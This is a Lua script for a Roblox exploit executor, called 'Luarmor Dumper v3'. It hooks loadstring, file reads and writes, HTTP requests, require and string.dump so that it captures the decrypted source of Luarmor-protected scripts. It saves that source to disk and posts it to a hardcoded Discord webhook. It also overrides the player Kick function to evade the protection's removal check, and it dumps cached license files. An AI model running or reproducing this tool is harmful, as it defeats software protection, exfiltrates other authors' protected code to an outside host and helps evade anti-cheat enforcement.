--[[
    Luarmor Dumper v3
    Deep hooks — captures VM output, writefile, environment dumps
]]

local WEBHOOK = "https://discord.com/api/webhooks/1512685201141272736/0i_pKRKISAT_DUXh6IuauiL4S9ZDsmz-xgv-kIXYBjjkScVG51e2iTgf_HsHaUJu-3Of"

local function send(msg)
    local body = game:GetService("HttpService"):JSONEncode({content = "```lua\n" .. msg:sub(1, 1900) .. "\n```"})
    local headers = {["Content-Type"] = "application/json"}
    pcall(function()
        if http_request then http_request({Url = WEBHOOK, Method = "POST", Headers = headers, Body = body})
        elseif request then request({Url = WEBHOOK, Method = "POST", Headers = headers, Body = body})
        elseif syn and syn.request then syn.request({Url = WEBHOOK, Method = "POST", Headers = headers, Body = body})
        end
    end)
end

local function saveFile(name, content)
    pcall(function()
        if not isfolder("luarmor_dump") then makefolder("luarmor_dump") end
        writefile("luarmor_dump/" .. name .. ".lua", content)
    end)
end

-- HOOK 1: loadstring (main capture)
local oldLoadstring = loadstring
loadstring = function(code, name)
    if code and type(code) == "string" and #code > 50 then
        local dumpName = name or ("ls_" .. tick():gsub("%.", ""))
        saveFile(dumpName, code)
        send("[LOADSTRING] " .. dumpName .. " (" .. #code .. " bytes)\n" .. code:sub(1, 1800))
    end
    return oldLoadstring(code, name)
end

-- HOOK 2: writefile (capture cached scripts)
if writefile then
    local oldWritefile = writefile
    writefile = function(path, content)
        if content and type(content) == "string" and #content > 50 then
            send("[WRITEFILE] " .. path .. " (" .. #content .. " bytes)\n" .. content:sub(1, 1800))
            saveFile("written_" .. path:gsub("[/\\]", "_"), content)
        end
        return oldWritefile(path, content)
    end
end

-- HOOK 3: readfile (capture cached reads)
if readfile then
    local oldReadfile = readfile
    readfile = function(path)
        local result = oldReadfile(path)
        if result and type(result) == "string" and #result > 200 then
            send("[READFILE] " .. path .. " (" .. #result .. " bytes)")
        end
        return result
    end
end

-- HOOK 4: HttpGet via __namecall
pcall(function()
    if hookmetamethod and getnamecallmethod then
        local oldNamecall
        oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
            local method = getnamecallmethod()
            if method == "HttpGet" or method == "HttpGetAsync" then
                local args = {...}
                local url = args[1] or "unknown"
                local result = oldNamecall(self, ...)
                if result and type(result) == "string" and #result > 100 then
                    send("[HTTP_" .. method .. "] " .. url .. " (" .. #result .. " bytes)")
                    saveFile("http_" .. tostring(url):gsub("[^%w]", "_"):sub(1, 50), result)
                end
                return result
            end
            return oldNamecall(self, ...)
        end)
    end
end)

-- HOOK 5: Hook all global functions that could execute code
local oldRequire = require
require = function(module, ...)
    local result = oldRequire(module, ...)
    if type(result) == "string" and #result > 100 then
        send("[REQUIRE] " .. tostring(module) .. " (" .. #result .. " bytes)")
        saveFile("require_" .. tostring(module):gsub("[^%w]", "_"), result)
    end
    return result
end

-- HOOK 6: string.dump (bytecode dump)
local oldStringDump = string.dump
string.dump = function(fn, strip)
    local result = oldStringDump(fn, strip)
    if result and #result > 100 then
        send("[STRING_DUMP] " .. #result .. " bytes")
        saveFile("dump_" .. tick():gsub("%.", ""), result)
    end
    return result
end

-- HOOK 7: getfenv dump (capture environment changes)
local originalEnv = getfenv()
local envChecked = false

-- HOOK 8: Anti-kick (prevent Luarmor from kicking)
pcall(function()
    local Players = game:GetService("Players")
    local oldKick = Players.LocalPlayer.Kick
    Players.LocalPlayer.Kick = function(self, msg)
        send("[KICK_BLOCKED] " .. tostring(msg))
        -- Don't actually kick
    end
end)

-- HOOK 9: Capture new globals after VM runs
task.spawn(function()
    task.wait(20) -- Wait for VM to execute
    local newEnv = getfenv()
    for key, value in pairs(newEnv) do
        if originalEnv[key] == nil and type(value) == "function" then
            send("[NEW_GLOBAL] " .. key .. " = function")
            -- Try to dump the function
            pcall(function()
                local dump = string.dump(value)
                saveFile("global_" .. key, dump)
            end)
        elseif originalEnv[key] == nil and type(value) == "string" and #value > 50 then
            send("[NEW_GLOBAL] " .. key .. " = string (" .. #value .. " bytes)\n" .. value:sub(1, 500))
            saveFile("global_" .. key, value)
        elseif originalEnv[key] == nil and type(value) == "table" then
            send("[NEW_GLOBAL] " .. key .. " = table")
        end
    end
    
    -- Also check _G and shared
    pcall(function()
        for key, value in pairs(_G) do
            if type(value) == "string" and #value > 200 then
                send("[_G] " .. key .. " = string (" .. #value .. " bytes)\n" .. value:sub(1, 1500))
                saveFile("g_" .. key, value)
            elseif type(value) == "function" then
                pcall(function()
                    local dump = string.dump(value)
                    if #dump > 100 then
                        send("[_G] " .. key .. " = function (" .. #dump .. " bytes bytecode)")
                        saveFile("g_" .. key, dump)
                    end
                end)
            end
        end
    end)
    
    -- Dump static_content folder
    pcall(function()
        if isfolder("static_content_130525") then
            local files = listfiles("static_content_130525")
            for _, file in ipairs(files) do
                local content = readfile(file)
                if content and #content > 200 then
                    send("[CACHE] " .. file .. " (" .. #content .. " bytes)\n" .. content:sub(1, 1800))
                    saveFile("cache_" .. file:gsub("[/\\]", "_"), content)
                end
            end
        end
    end)
end)

send("✅ DUMPER v3 ACTIVE\n\nHooks installed:\n• loadstring\n• writefile\n• readfile\n• __namecall (HTTP)\n• require\n• string.dump\n• anti-kick\n\nGlobal dump in 20s.\nWaiting for Luarmor payload...")

print("[Dumper v3] All hooks installed!")
print("[Dumper v3] Anti-kick enabled")
print("[Dumper v3] Global dump in 20 seconds")
print("[Dumper v3] Now run the Luarmor loadstring")

-- Visual confirmation in-game
pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "✅ Dumper v3 Active",
        Text = "All hooks installed! Now execute Luarmor script.",
        Duration = 10
    })
end)
